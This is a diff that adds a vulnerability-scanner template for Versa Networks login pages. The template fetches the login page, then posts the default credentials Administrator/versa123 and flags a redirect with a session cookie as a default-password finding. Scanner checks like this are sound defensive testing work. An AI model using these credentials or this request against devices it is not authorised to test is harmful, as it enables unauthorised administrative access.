@@ -1,0 +1,41 @@
+id:
+name: Versa-Default-Login
+tags:
+  - Versa-Networks
+transport: http
+rules:
+  r0:
+    request:
+      cache: false
+      method: GET
+      path: /versa/login.html
+      headers:
+        Accept-Encoding: gzip, deflate
+      follow_redirects: true
+    expression: response.status==200
+  r1:
+    request:
+      cache: true
+      method: POST
+      path: /versa/login
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        X-Requested-With: XMLHttpRequest
+        Content-Length: 56
+        Connection: close
+        Sec-Fetch-Dest: empty
+        Sec-Fetch-Mode: cors
+        Sec-Fetch-Site: same-origin
+      body: username=Administrator&password=versa123&sso=systemRadio
+    expression: response.status==302 &&
+                'Location' in response.headers && response.headers['Location'].contains('/versa/index.html') &&
+                'Set-Cookie' in response.headers && response.headers['Set-Cookie'].contains('JSESSIONID')
+
+expression: r0() && r1()
+detail:
+  vulnerability:
+    proof:
+      info: "存在Versa-Default-Login 默认口令漏洞"
